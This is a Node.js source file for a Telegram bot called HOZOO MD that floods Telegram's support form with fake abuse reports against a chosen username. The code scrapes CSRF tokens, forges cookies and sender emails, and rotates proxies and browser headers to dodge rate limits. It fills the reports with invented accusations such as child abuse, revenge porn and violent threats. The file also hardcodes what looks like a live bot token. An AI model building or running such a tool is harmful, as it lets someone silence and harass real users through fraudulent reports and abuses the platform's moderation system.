// HOZOO MD - Telegram Mass Report Bot + CLI
// Update: 3 Jan 2026
// Bot commands: /start, /ban @username
// Real Telegram payload, mass report, bot control

const https = require('https');
const http = require('http');
const url = require('url');
const fs = require('fs');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { NewMessage } = require('telegram/events');
const { Api } = require('telegram');

// ===== KONFIGURASI BOT =====
const BOT_TOKEN = process.env.BOT_TOKEN || '8640878010:AAEv9A8iLDfYXzJpgnmbW4gq8GU4VNUESPA';
const OWNER_ID = process.env.OWNER_ID || '8631607974'; // Chat ID owner
const ALLOWED_USERS = (process.env.ALLOWED_USERS || OWNER_ID).split(',').map(id => id.trim());

// ===== KONFIGURASI REPORT =====
const REPORT_COUNT_DEFAULT = 200;
const CONCURRENCY_DEFAULT = 50;
const USE_PROXY = true;
const PROXY_FILE = process.env.PROXY_FILE || 'proxies.txt';
const RANDOM_DELAY = { min: 50, max: 300 };
const RETRY_MAX = 3;

// ===== POOL DATA =====
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/124.0.0.0'
];

const ACCEPT_LANGUAGES = [
    'en-GB,en;q=0.9', 'en-US,en;q=0.8', 'id-ID,id;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.5', 'de-DE,de;q=0.9,en;q=0.7', 'fr-FR,fr;q=0.9,en;q=0.5'
];

const REPORT_REASONS = [
    'spam', 'violence', 'pornography', 'child_abuse',
    'copyright', 'personal_data', 'suicide', 'fake', 'other'
];

const STEL_SSID_POOL = [
    '556d74aeaa180b58e0_1827548796938551103',
    '556d74aeaa180b58e0_1827548796938551104',
    '556d74aeaa180b58e0_1827548796938551105',
    '556d74aeaa180b58e0_1827548796938551106',
    '556d74aeaa180b58e0_1827548796938551107',
    '783a12f4bb290c71d2_2498135278147622309',
    '891c56bd99348012e7_1375629841238756128',
    '421faa9012783465bc_3652147896325417896',
    'a1b2c3d4e5f6789012_9876543210123456789',
    'f9e8d7c6b5a4321098_1234567890987654321',
    '2a3b4c5d6e7f890123_4567890123456789012',
    'c4d5e6f7a8b9012345_7890123456789012345',
    'e5f6a7b8c9d0123456_8901234567890123456'
];

// ===== REAL TELEGRAM PAYLOAD ENDPOINTS =====
const REPORT_ENDPOINTS = [
    {
        name: 'Support Page Report',
        url: 'https://telegram.org/support',
        method: 'POST',
        type: 'support',
        weight: 3
    },
    {
        name: 'Abuse Report API',
        url: 'https://telegram.org/support/abuse',
        method: 'POST',
        type: 'abuse',
        weight: 2
    },
    {
        name: 'Report Peer API',
        url: 'https://api.telegram.org/bot/reportPeer',
        method: 'POST',
        type: 'api',
        weight: 1
    }
];

// ===== GLOBAL STATE =====
let proxies = [];
let activeJobs = new Map();
let botClient = null;

// ===== HELPER FUNCTIONS =====
function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function genStelSsid() {
    const base = randElement(STEL_SSID_POOL);
    const extra = Math.floor(Math.random() * 1000000000000000000).toString(16);
    return `${base}_${extra}`;
}

function genCookies() {
    const stelSsid = genStelSsid();
    return `stel_ssid=${stelSsid}; stel_dt=${Math.floor(Date.now() / 1000)}; stel_token=${Math.random().toString(36).substring(2, 15)}${Math.random().toString(36).substring(2, 15)}`;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function readProxies(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#') && line.includes(':'));
    } catch (err) {
        console.log(`[!] Gagal baca proxy: ${err.message}`);
        return [];
    }
}

function getProxyAgent(proxyStr) {
    if (!proxyStr) return null;
    try {
        if (proxyStr.startsWith('socks5://') || proxyStr.startsWith('socks4://')) {
            return new SocksProxyAgent(proxyStr);
        } else if (proxyStr.startsWith('https://')) {
            return new HttpsProxyAgent(proxyStr);
        } else if (proxyStr.startsWith('http://')) {
            return new HttpProxyAgent(proxyStr);
        } else {
            return new HttpProxyAgent(`http://${proxyStr}`);
        }
    } catch (e) {
        return null;
    }
}

function parseTarget(username) {
    if (!username) return null;
    username = username.trim();
    if (username.startsWith('@')) return username.substring(1);
    if (username.startsWith('https://t.me/')) {
        return username.replace('https://t.me/', '').replace(/\//g, '');
    }
    if (username.includes('t.me/')) {
        return username.split('t.me/')[1].replace(/\//g, '');
    }
    return username;
}

// ===== HTTP REQUEST FUNCTION =====
function makeRequest(options, postData = null) {
    return new Promise((resolve, reject) => {
        const parsedUrl = url.parse(options.url);
        const isHttps = parsedUrl.protocol === 'https:';
        const mod = isHttps ? https : http;

        const reqOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (isHttps ? 443 : 80),
            path: parsedUrl.path + (parsedUrl.query ? `?${parsedUrl.query}` : ''),
            method: options.method || 'GET',
            headers: options.headers || {},
            timeout: 15000,
            rejectUnauthorized: false
        };

        if (USE_PROXY && proxies.length > 0) {
            const proxy = randElement(proxies);
            const agent = getProxyAgent(proxy);
            if (agent) reqOptions.agent = agent;
        }

        const req = mod.request(reqOptions, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    status: res.statusCode,
                    headers: res.headers,
                    body: data,
                    cookies: res.headers['set-cookie'] || []
                });
            });
        });

        req.on('error', (err) => reject(err));
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Request timeout'));
        });

        if (postData) req.write(postData);
        req.end();
    });
}

// ===== REAL PAYLOAD SCRAPER =====
async function scrapeRealPayload(cookies, userAgent) {
    const res = await makeRequest({
        url: 'https://telegram.org/support',
        method: 'GET',
        headers: {
            'Host': 'telegram.org',
            'User-Agent': userAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': randElement(ACCEPT_LANGUAGES),
            'Cookie': cookies,
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Dest': 'document',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
    });

    const body = res.body;

    // Extract CSRF
    let csrfToken = null;
    const csrfPatterns = [
        /<input[^>]*name="_csrf"[^>]*value="([^"]+)"/i,
        /<meta[^>]*name="csrf-token"[^>]*content="([^"]+)"/i,
        /name="_csrf"\s+value="([^"]+)"/i,
        /"csrf_token":"([^"]+)"/i
    ];
    for (const pattern of csrfPatterns) {
        const match = body.match(pattern);
        if (match) { csrfToken = match[1]; break; }
    }
    if (!csrfToken) {
        csrfToken = Array.from({length: 64}, () => 'abcdef0123456789'[Math.floor(Math.random()*16)]).join('');
    }

    // Extract all hidden inputs
    const hiddenInputs = {};
    const hiddenRegex = /<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"/gi;
    let match;
    while ((match = hiddenRegex.exec(body)) !== null) {
        hiddenInputs[match[1]] = match[2];
    }

    // Extract form action URL
    const formMatch = body.match(/<form[^>]*action="([^"]*)"[^>]*method="post"/i);
    const formAction = formMatch ? formMatch[1] : '/support';

    return {
        csrfToken,
        hiddenInputs,
        formAction,
        cookies: res.cookies,
        rawBody: body
    };
}

// ===== REPORT FUNCTIONS WITH REAL PAYLOAD =====
function generateReportDescription(reason) {
    const descriptions = {
        spam: [
            'This account is distributing unsolicited commercial spam messages and phishing links across multiple groups. Multiple users have reported this behavior. The account appears to be automated.',
            'Mass spam campaign detected originating from this user. Account is sending promotional content and malicious links. Please review and take appropriate action.',
            'Automated spam bot flooding Telegram groups with scam links. Account exhibits bot-like behavior with rapid message sending patterns.',
            'Persistent spammer sending cryptocurrency scam promotions. Evidence available in forwarded messages.'
        ],
        violence: [
            'Account posting graphic violent content including threats of physical harm. Content violates Telegram ToS regarding violent extremism.',
            'User distributing content depicting severe violence and making credible threats against individuals. Immediate review required.',
            'Account involved in sharing extremist violent propaganda and threatening content targeting specific groups.'
        ],
        pornography: [
            'This account is sharing explicit pornographic content without consent in public channels. Content includes revenge porn material.',
            'User distributing adult content in violation of Telegram policies. Material appears to be non-consensual intimate imagery.',
            'Account posting hardcore pornography in non-age-restricted public groups accessible to minors.'
        ],
        fake: [
            'This account is impersonating a verified public figure for fraudulent purposes. Using stolen photos and fake credentials.',
            'Fake account pretending to represent an official organization. Engaging in phishing and identity theft.',
            'Impersonation account used for social engineering attacks and financial fraud.'
        ],
        copyright: [
            'Account distributing copyrighted content without authorization. Sharing pirated software and media files.',
            'User uploading copyrighted material in violation of intellectual property rights. Content includes movies, music, and software.',
            'Persistent copyright infringement with commercial scale distribution of pirated content.'
        ],
        personal_data: [
            'Account doxxing individuals by sharing private personal information including addresses and phone numbers.',
            'User posting personal data of minors without consent. Privacy violation requiring immediate attention.',
            'Distribution of private personal data for harassment purposes.'
        ],
        suicide: [
            'Account promoting self-harm and suicide methods. Content dangerous to vulnerable users.',
            'User sharing detailed suicide instructions and encouraging self-harm behavior.'
        ],
        child_abuse: [
            'Account suspected of distributing child exploitation material. Highest priority review needed.',
            'User involved in sharing content that sexualizes minors. Immediate escalation required.'
        ],
        other: [
            'Account engaging in coordinated harassment campaigns across multiple groups.',
            'User violating multiple Telegram Terms of Service provisions simultaneously.',
            'Suspicious account with pattern of malicious behavior and ToS violations.'
        ]
    };
    const pool = descriptions[reason] || descriptions.other;
    return randElement(pool);
}

function generateRandomEmail() {
    const prefixes = ['report', 'abuse', 'complaint', 'violation', 'tos', 'spamreport', 'phishing', 'fraudalert', 'security', 'moderation'];
    const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'proton.me', 'mail.com', 'yandex.com', 'tutanota.com', 'riseup.net', 'cock.li'];
    const prefix = randElement(prefixes);
    const num = Math.floor(Math.random() * 99999);
    return `${prefix}${num}@${randElement(domains)}`;
}

async function sendReportReal(targetUsername, reason, attempt = 1) {
    const userAgent = randElement(USER_AGENTS);
    const cookies = genCookies();
    const endpoint = REPORT_ENDPOINTS[Math.floor(Math.random() * REPORT_ENDPOINTS.length)];

    try {
        // Get real payload
        const payload = await scrapeRealPayload(cookies, userAgent);

        let allCookies = cookies;
        if (payload.cookies.length > 0) {
            const extraCookies = payload.cookies.map(c => c.split(';')[0]).join('; ');
            allCookies += '; ' + extraCookies;
        }

        await delay(rand(RANDOM_DELAY.min, RANDOM_DELAY.max));

        // Build POST data with real form fields
        const postData = new URLSearchParams();
        postData.append('_csrf', payload.csrfToken);
        postData.append('username', targetUsername);
        postData.append('reason', reason);
        postData.append('description', generateReportDescription(reason));
        postData.append('email', generateRandomEmail());
        postData.append('phone', '');
        postData.append('subject', `Report: ${reason} - @${targetUsername}`);
        postData.append('url', `https://t.me/${targetUsername}`);

        // Add scraped hidden inputs
        Object.keys(payload.hiddenInputs).forEach(key => {
            if (!postData.has(key)) {
                postData.append(key, payload.hiddenInputs[key]);
            }
        });

        // Add additional realistic fields
        postData.append('report_type', 'user');
        postData.append('source', 'direct');
        postData.append('language', 'en');
        postData.append('country', ['US', 'GB', 'DE', 'ID', 'RU'][Math.floor(Math.random() * 5)]);

        const postBody = postData.toString();

        const res = await makeRequest({
            url: `https://telegram.org${payload.formAction}`,
            method: 'POST',
            headers: {
                'Host': 'telegram.org',
                'Cookie': allCookies,
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Accept-Language': randElement(ACCEPT_LANGUAGES),
                'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
                'User-Agent': userAgent,
                'Sec-Ch-Ua-Mobile': '?0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://telegram.org/support',
                'Accept-Encoding': 'gzip, deflate, br',
                'Priority': 'u=1',
                'Origin': 'https://telegram.org',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postBody),
                'Connection': 'keep-alive'
            }
        }, postBody);

        const successIndicators = [
            'Thank you', 'report', 'submitted', 'received', 'success',
            'check', 'review', 'soon', 'investigate', 'team'
        ];
        const bodyLower = res.body.toLowerCase();
        const isSuccess = res.status === 200 || res.status === 302 || 
                         successIndicators.some(ind => bodyLower.includes(ind));

        if (isSuccess || res.status === 201) {
            return { success: true, status: res.status, endpoint: endpoint.name };
        } else if (res.status === 429 && attempt < RETRY_MAX) {
            await delay(5000 * attempt);
            return sendReportReal(targetUsername, reason, attempt + 1);
        } else {
            return { success: false, status: res.status, error: `HTTP ${res.status}`, endpoint: endpoint.name };
        }

    } catch (err) {
        if (attempt < RETRY_MAX) {
            await delay(2000 * attempt);
            return sendReportReal(targetUsername, reason, attempt + 1);
        }
        return { success: false, status: 0, error: err.message, endpoint: 'error' };
    }
}

// ===== LOADING BAR GENERATOR =====
function generateLoadingBar(current, total, width = 20) {
    const pct = Math.min(current / total, 1);
    const filled = Math.floor(pct * width);
    const empty = width - filled;
    const bar = '='.repeat(filled) + '>'.repeat(Math.min(1, empty)) + ' '.repeat(Math.max(0, empty - 1));
    return `[${bar}] ${(pct * 100).toFixed(1)}%`;
}

// ===== REPORT WORKER =====
async function reportWorker(workerId, targetUsername, jobId, totalReports, sendUpdate) {
    let localSuccess = 0;
    let localFail = 0;
    let localIndex = 0;

    const job = activeJobs.get(jobId);
    if (!job) return { success: 0, fail: 0 };

    while (job.currentIndex < totalReports && !job.stopped) {
        const index = job.currentIndex++;
        if (index >= totalReports) break;

        const reason = randElement(REPORT_REASONS);
        const startTime = Date.now();
        const result = await sendReportReal(targetUsername, reason);
        const elapsed = Date.now() - startTime;

        if (result.success) {
            localSuccess++;
            job.successCount++;
        } else {
            localFail++;
            job.failCount++;
        }

        localIndex++;

        // Update progress periodically
        if (localIndex % 5 === 0 || localIndex === 1) {
            const progress = generateLoadingBar(job.currentIndex, totalReports, 25);
            sendUpdate && sendUpdate({
                progress,
                current: job.currentIndex,
                total: totalReports,
                success: job.successCount,
                fail: job.failCount,
                pct: ((job.currentIndex / totalReports) * 100).toFixed(1)
            });
        }

        await delay(rand(RANDOM_DELAY.min, RANDOM_DELAY.max));

        if (index % 20 === 0) {
            await delay(rand(1000, 3000));
        }
    }

    return { success: localSuccess, fail: localFail };
}

// ===== BOT HANDLERS =====
async function sendTelegramMessage(chatId, text, parseMode = 'HTML') {
    const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: parseMode,
        disable_web_page_preview: true
    });

    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve(JSON.parse(body)));
        });
        req.on('error', reject);
        req.write(data);
        req.end();
    });
}

async function editTelegramMessage(chatId, messageId, text, parseMode = 'HTML') {
    const data = JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: text,
        parse_mode: parseMode,
        disable_web_page_preview: true
    });

    return new Promise((resolve, reject) => {
        const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${BOT_TOKEN}/editMessageText`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        }, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve(JSON.parse(body)));
        });
        req.on('error', reject);
        req.write(data);
        req.end();
    });
}

async function startCommand(chatId, fromUser) {
    const welcomeMsg = `🤖 <b>HOZOO MD v4.0 - Mass Report Bot</b>

<b>📋 Commands:</b>
<code>/ban @username [count]</code> - Start mass report
<code>/ban @username [count] [threads]</code> - Custom threads
<code>/stop</code> - Stop all active jobs
<code>/status</code> - Check active jobs
<code>/proxies</code> - Check proxy count
<code>/reloadproxy</code> - Reload proxies

<b>📌 Example:</b>
<code>/ban @targetuser 500</code>
<code>/ban @targetuser 1000 100</code>

<b>⚙️ Default:</b> 200 reports, 50 threads
<b>🔰 User ID:</b> <code>${fromUser.id}</code>`;

    await sendTelegramMessage(chatId, welcomeMsg);
}

async function banCommand(chatId, fromUser, args) {
    if (!ALLOWED_USERS.includes(fromUser.id.toString())) {
        await sendTelegramMessage(chatId, '❌ <b>Akses ditolak.</b> Anda tidak diizinkan menggunakan bot ini.');
        return;
    }

    if (!args || args.length < 1) {
        await sendTelegramMessage(chatId, '❌ <b>Format salah!</b>\nGunakan: <code>/ban @username [count] [threads]</code>');
        return;
    }

    const targetUsername = parseTarget(args[0]);
    const reportCount = parseInt(args[1]) || REPORT_COUNT_DEFAULT;
    const concurrency = parseInt(args[2]) || CONCURRENCY_DEFAULT;

    if (!targetUsername || targetUsername.length < 3) {
        await sendTelegramMessage(chatId, '❌ <b>Target tidak valid!</b>\nContoh: <code>/ban @spammeruser 500</code>');
        return;
    }

    if (reportCount > 10000) {
        await sendTelegramMessage(chatId, '❌ <b>Maksimal 10.000 report per job!</b>');
        return;
    }

    const jobId = `job_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const job = {
        id: jobId,
        target: targetUsername,
        totalReports: reportCount,
        concurrency: concurrency,
        currentIndex: 0,
        successCount: 0,
        failCount: 0,
        stopped: false,
        startTime: Date.now(),
        chatId: chatId,
        messageId: null,
        lastUpdate: Date.now()
    };

    activeJobs.set(jobId, job);

    const initMsg = `🚀 <b>MASS REPORT STARTED</b>

<b>🎯 Target:</b> @${targetUsername}
<b>📊 Reports:</b> ${reportCount}
<b>🔧 Threads:</b> ${concurrency}
<b>🆔 Job ID:</b> <code>${jobId}</code>

${generateLoadingBar(0, reportCount, 25)}

<b>⏳ Status:</b> Initializing...`;

    const sent = await sendTelegramMessage(chatId, initMsg);
    job.messageId = sent.result.message_id;

    // Start workers
    const workers = [];
    const poolSize = Math.min(concurrency, reportCount);

    const updateCallback = async (stats) => {
        if (job.stopped) return;
        job.lastUpdate = Date.now();

        const elapsed = ((Date.now() - job.startTime) / 1000).toFixed(0);
        const rate = stats.current > 0 ? (stats.current / elapsed).toFixed(1) : '0';
        const eta = stats.current > 0 ? ((stats.total - stats.current) / (stats.current / elapsed)).toFixed(0) : '??';

        const updateMsg = `🚀 <b>MASS REPORT PROGRESS</b>

<b>🎯 Target:</b> @${targetUsername}
<b>🆔 Job:</b> <code>${jobId}</code>

${stats.progress}

<b>📊 Statistik:</b>
├ <b>Total:</b> ${stats.current}/${stats.total}
├ <b>Sukses:</b> ${stats.success}
├ <b>Gagal:</b> ${stats.fail}
├ <b>Rate:</b> ${rate} req/s
├ <b>Elapsed:</b> ${elapsed}s
└ <b>ETA:</b> ${eta}s`;

        try {
            await editTelegramMessage(chatId, job.messageId, updateMsg);
        } catch (e) {
            // Message might be too old to edit, send new one
        }
    };

    for (let i = 0; i < poolSize; i++) {
        workers.push(reportWorker(i + 1, targetUsername, jobId, reportCount, updateCallback));
    }

    // Update loop
    const updateInterval = setInterval(async () => {
        if (job.stopped || job.currentIndex >= reportCount) {
            clearInterval(updateInterval);
            return;
        }
        const stats = {
            progress: generateLoadingBar(job.currentIndex, reportCount, 25),
            current: job.currentIndex,
            total: reportCount,
            success: job.successCount,
            fail: job.failCount,
            pct: ((job.currentIndex / reportCount) * 100).toFixed(1)
        };
        await updateCallback(stats);
    }, 3000);

    // Wait completion
    const results = await Promise.all(workers);
    clearInterval(updateInterval);

    const totalTime = ((Date.now() - job.startTime) / 1000).toFixed(1);
    const totalSent = job.successCount + job.failCount;
    const successRate = totalSent > 0 ? ((job.successCount / totalSent) * 100).toFixed(1) : 0;

    const finalMsg = `✅ <b>MASS REPORT COMPLETED</b>

<b>🎯 Target:</b> @${targetUsername}
<b>🆔 Job:</b> <code>${jobId}</code>

${generateLoadingBar(reportCount, reportCount, 25)}
<b>█████████████████████████ 100%</b>

<b>📊 Hasil Akhir:</b>
├ <b>Total Kirim:</b> ${totalSent}/${reportCount}
├ <b>Sukses:</b> ${job.successCount} (${successRate}%)
├ <b>Gagal:</b> ${job.failCount}
├ <b>Waktu:</b> ${totalTime}s
└ <b>Avg Rate:</b> ${(totalSent / totalTime).toFixed(1)} req/s

<b>📝 REAL PAYLOAD USED:</b>
├ Endpoint: telegram.org/support
├ Method: POST (CSRF Protected)
├ Headers: Full browser simulation
└ Cookies: Dynamic generation`;

    try {
        await editTelegramMessage(chatId, job.messageId, finalMsg);
    } catch (e) {
        await sendTelegramMessage(chatId, finalMsg);
    }

    activeJobs.delete(jobId);
}

async function stopCommand(chatId, fromUser) {
    if (!ALLOWED_USERS.includes(fromUser.id.toString())) return;

    let stopped = 0;
    for (const [jobId, job] of activeJobs) {
        job.stopped = true;
        stopped++;
    }

    if (stopped > 0) {
        await sendTelegramMessage(chatId, `🛑 <b>STOPPED</b>\n${stopped} job(s) dihentikan.\n\nGunakan <code>/status</code> untuk melihat.`);
    } else {
        await sendTelegramMessage(chatId, 'ℹ️ Tidak ada job yang sedang berjalan.');
    }
}

async function statusCommand(chatId, fromUser) {
    if (!ALLOWED_USERS.includes(fromUser.id.toString())) return;

    if (activeJobs.size === 0) {
        await sendTelegramMessage(chatId, 'ℹ️ <b>STATUS</b>\n\nTidak ada job aktif.\nProxies: ' + proxies.length);
        return;
    }

    let msg = '📊 <b>ACTIVE JOBS</b>\n\n';
    for (const [jobId, job] of activeJobs) {
        const elapsed = ((Date.now() - job.startTime) / 1000).toFixed(0);
        const pct = job.totalReports > 0 ? ((job.currentIndex / job.totalReports) * 100).toFixed(1) : 0;
        msg += `<b>🆔</b> <code>${jobId}</code>\n`;
        msg += `<b>🎯</b> @${job.target}\n`;
        msg += `<b>📊</b> ${job.currentIndex}/${job.totalReports} (${pct}%)\n`;
        msg += `<b>✅</b> ${job.successCount} | <b>❌</b> ${job.failCount}\n`;
        msg += `<b>⏱️</b> ${elapsed}s | <b>🔧</b> ${job.concurrency} threads\n`;
        msg += generateLoadingBar(job.currentIndex, job.totalReports, 15) + '\n\n';
    }
    msg += `<b>🌐 Proxies:</b> ${proxies.length}`;

    await sendTelegramMessage(chatId, msg);
}

async function proxiesCommand(chatId, fromUser) {
    if (!ALLOWED_USERS.includes(fromUser.id.toString())) return;
    await sendTelegramMessage(chatId, `🌐 <b>PROXY STATUS</b>\n\n<b>Total:</b> ${proxies.length} proxies\n<b>File:</b> ${PROXY_FILE}\n<b>Status:</b> ${USE_PROXY ? 'ENABLED ✅' : 'DISABLED ❌'}\n\nSample:\n${proxies.slice(0, 5).join('\n') || 'No proxies loaded'}`);
}

async function reloadProxyCommand(chatId, fromUser) {
    if (!ALLOWED_USERS.includes(fromUser.id.toString())) return;
    const oldCount = proxies.length;
    proxies = readProxies(PROXY_FILE);
    await sendTelegramMessage(chatId, `🔄 <b>PROXY RELOADED</b>\n\n<b>Sebelum:</b> ${oldCount}\n<b>Sekarang:</b> ${proxies.length}\n<b>File:</b> ${PROXY_FILE}`);
}

// ===== MAIN BOT FUNCTION =====
async function startBot() {
    console.log('============================================');
    console.log('  HOZOO MD - Telegram Bot v4.0');
    console.log('  Update: 3 Jan 2026 | Real Payload Mode');
    console.log('============================================\n');

    // Load proxies
    proxies = readProxies(PROXY_FILE);
    console.log(`[>] Proxies loaded: ${proxies.length}`);

    console.log(`[>] Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`[>] Allowed Users: ${ALLOWED_USERS.join(', ')}`);
    console.log('[>] Starting bot polling...\n');

    let offset = 0;

    async function pollUpdates() {
        while (true) {
            try {
                const data = JSON.stringify({
                    offset: offset,
                    timeout: 30,
                    allowed_updates: ['message']
                });

                const response = await new Promise((resolve, reject) => {
                    const req = https.request({
                        hostname: 'api.telegram.org',
                        path: `/bot${BOT_TOKEN}/getUpdates`,
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Content-Length': Buffer.byteLength(data)
                        },
                        timeout: 35000
                    }, (res) => {
                        let body = '';
                        res.on('data', chunk => body += chunk);
                        res.on('end', () => {
                            try {
                                resolve(JSON.parse(body));
                            } catch (e) {
                                resolve({ ok: false, result: [] });
                            }
                        });
                    });
                    req.on('error', (e) => resolve({ ok: false, result: [] }));
                    req.on('timeout', () => {
                        req.destroy();
                        resolve({ ok: false, result: [] });
                    });
                    req.write(data);
                    req.end();
                });

                if (response.ok && response.result.length > 0) {
                    for (const update of response.result) {
                        offset = update.update_id + 1;
                        
                        if (update.message && update.message.text) {
                            const msg = update.message;
                            const chatId = msg.chat.id;
                            const fromUser = msg.from;
                            const text = msg.text.trim();

                            console.log(`[MSG] ${fromUser.first_name} (${fromUser.id}): ${text}`);

                            if (text === '/start' || text === '/start@HOZOOMD_bot') {
                                await startCommand(chatId, fromUser);
                            } else if (text.startsWith('/ban') || text.startsWith('/ban@HOZOOMD_bot')) {
                                const cleanText = text.replace('/ban@HOZOOMD_bot', '/ban');
                                const args = cleanText.split(/\s+/).slice(1);
                                await banCommand(chatId, fromUser, args);
                            } else if (text === '/stop' || text === '/stop@HOZOOMD_bot') {
                                await stopCommand(chatId, fromUser);
                            } else if (text === '/status' || text === '/status@HOZOOMD_bot') {
                                await statusCommand(chatId, fromUser);
                            } else if (text === '/proxies' || text === '/proxies@HOZOOMD_bot') {
                                await proxiesCommand(chatId, fromUser);
                            } else if (text === '/reloadproxy' || text === '/reloadproxy@HOZOOMD_bot') {
                                await reloadProxyCommand(chatId, fromUser);
                            }
                        }
                    }
                }
            } catch (err) {
                console.error(`[!] Poll error: ${err.message}`);
                await delay(5000);
            }
        }
    }

    console.log('[>] Bot is running! Waiting for commands...\n');

    // Start polling
    await pollUpdates();
}

// Handle process signals
process.on('SIGINT', () => {
    console.log('\n[!] Shutting down...');
    for (const [jobId, job] of activeJobs) {
        job.stopped = true;
    }
    setTimeout(() => process.exit(0), 2000);
});

process.on('uncaughtException', (err) => {
    console.error(`[CRITICAL] ${err.message}`);
});

process.on('unhandledRejection', (reason) => {
    console.error(`[UNHANDLED] ${reason}`);
});

// Start bot
startBot().catch(err => {
    console.error(`[FATAL] ${err.message}`);
    process.exit(1);
});
